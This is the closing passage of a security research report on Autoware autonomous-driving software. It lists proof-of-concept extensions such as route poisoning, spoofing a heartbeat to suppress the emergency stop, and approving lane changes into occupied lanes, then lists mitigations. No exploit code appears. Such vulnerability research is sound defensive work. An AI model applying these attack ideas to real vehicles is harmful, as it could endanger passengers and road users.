These are the most likely services to be reachable through any V2X, cloud backend, or telematics integration, making them the highest-priority attack surface for an adversary with remote (non-physical) access to the vehicle network.

---

## 10. Suggested Next Steps

### Immediate PoC extensions

1. **End-to-end chain against real Autoware simulation** — Run the exploit against the `autoware_simple_planning_simulator` with a vehicle in motion and record the kinematic state change in a ROS 2 bag. This produces the strongest possible evidence of real-world impact.

2. **External API pathway demonstration** — Demonstrate that the `/api/` namespace services are reachable through a simulated telematics bridge (two Docker containers, no host networking) to prove the remote reachability claim concretely.

3. **MRM route poisoning** — Set a malicious MRM route, then trigger an MRM condition and show the vehicle navigates to the attacker-specified destination.

4. **Heartbeat spoofing for emergency stop suppression** — Publish a spoofed heartbeat on `input/external_emergency_stop_heartbeat` while clearing the emergency stop state, demonstrating that the only guard on service #4 is bypassable.

### Deeper code review candidates

- **RTC cooperate interface** (`/planning/autoware_rtc_interface/`) — The dynamic service names and behavior approval mechanism warrant detailed review; approving a lane change into an occupied lane is a high-impact, low-visibility attack.
- **Plugin loading** (`/perception/autoware_tensorrt_common/`) — Plugin `.so` files loaded from ROS parameters without signature verification; a compromised parameter server yields arbitrary code execution at the perception layer.
- **Diagnostic graph logic** (`/system/autoware_diagnostic_graph_aggregator/`) — Understanding exactly which fault conditions trigger MRM would allow more targeted diagnostic masking attacks.

### Mitigations worth evaluating

- **SROS2** — DDS Security with access control policies would address the root cause. The key question is whether Autoware has evaluated the performance overhead in real-time control contexts.
- **Service-layer guards** — Short of DDS-level security, individual service callbacks could implement caller identity checks using ROS 2's node name or namespace, though this is spoofable.
- **Network isolation** — Segregating the DDS domain from any network with external connectivity (telematics, Wi-Fi) at the OS or hardware level reduces reachability without code changes.

---

*This document reflects findings from static source analysis and proof-of-concept testing on autoware_universe commit 54af299ab (v0.51.0). All research was conducted in a local simulation environment with no physical vehicles.*
